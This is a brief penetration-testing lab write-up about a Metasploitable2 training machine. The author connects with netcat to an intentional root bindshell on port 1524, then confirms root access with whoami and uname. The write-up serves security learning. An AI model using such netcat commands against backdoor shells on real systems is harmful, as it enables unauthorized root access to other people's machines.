# Metasploitable2 -- Port 1524 Bindshell

## Target
- IP: 192.168.110.3
- Service: bindshell (Metasploitable root shell)
- Port: 1524/tcp

## Discovery
Initial nmap scan on the target IP revealed port 1524 advertising itself as a root shell:
## Exploitation
No exploit required as I was connected directly using Netcat:
```bash
nc 192.168.110.3 1524
```

I recieved an immediate root shell with no authentication.

## Post-Exploitation
```bash
whoami     # root
uname -a   # Linux metaslpoitable 2.6.24-16-server (2008 kernel)
```

## Takeaway
Port 1524 is an intentional backdoor on Metasploitable2. In real world engagement, bindshells appear when an attacker has already compromised a machine and left a persistent backdoor. Discovering one mostly means the machine was previously owned.
